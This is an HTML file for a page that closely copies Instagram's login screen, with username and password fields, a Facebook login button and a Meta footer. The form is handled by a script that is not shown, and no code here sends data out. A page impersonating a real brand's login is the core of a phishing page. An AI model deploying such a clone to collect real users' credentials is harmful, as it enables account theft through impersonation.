<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <main class="page">

    <!-- Left: illustration (hidden on small screens) -->
    <section class="hero" aria-hidden="true">
      <img src="bd.jpeg" alt="">
    </section>

    <!-- Right: login -->
    <section class="login">
      <h1 class="logo">Instagram</h1>

      <form id="loginForm" novalidate>
        <div class="field">
          <input type="text" id="username" name="username" placeholder=" "
                 autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false">
          <label for="username">Phone number, username, or email</label>
        </div>

        <div class="field">
          <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password">
          <label for="password">Password</label>
          <button type="button" class="toggle" id="togglePw" aria-label="Show password">Show</button>
        </div>

        <button type="submit" class="btn-login" id="loginBtn" disabled>Log in</button>
        <p class="form-msg" id="formMsg" role="alert" hidden></p>
      </form>

      <div class="divider"><span>OR</span></div>

      <button type="button" class="btn-fb">
        <img src="facebooklogo.jpeg" alt="">
        <span>Log in with Facebook</span>
      </button>

      <a href="#" class="forgot">Forgot password?</a>

      <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
    </section>

  </main>

  <footer class="footer">
    <nav aria-label="Footer">
      <ul>
        <li><a href="#">Meta</a></li>
        <li><a href="#">About</a></li>
        <li><a href="#">Blog</a></li>
        <li><a href="#">Jobs</a></li>
        <li><a href="#">Help</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Terms</a></li>
        <li><a href="#">Locations</a></li>
        <li><a href="#">Instagram Lite</a></li>
        <li><a href="#">Meta AI</a></li>
        <li><a href="#">Meta AI Articles</a></li>
        <li><a href="#">Threads</a></li>
        <li><a href="#">Contact Uploading &amp; Non-Users</a></li>
        <li><a href="#">Meta Verified</a></li>
      </ul>
    </nav>

    <div class="footer-bottom">
      <select class="lang" aria-label="Language">
        <option>English</option>
        <option>Español</option>
        <option>Français</option>
        <option>Deutsch</option>
        <option>Português</option>
        <option>Italiano</option>
      </select>
      <span>&copy; <span id="year">2025</span> Instagram from Meta</span>
    </div>
  </footer>

  <script src="script.js"></script>
</body>
</html>
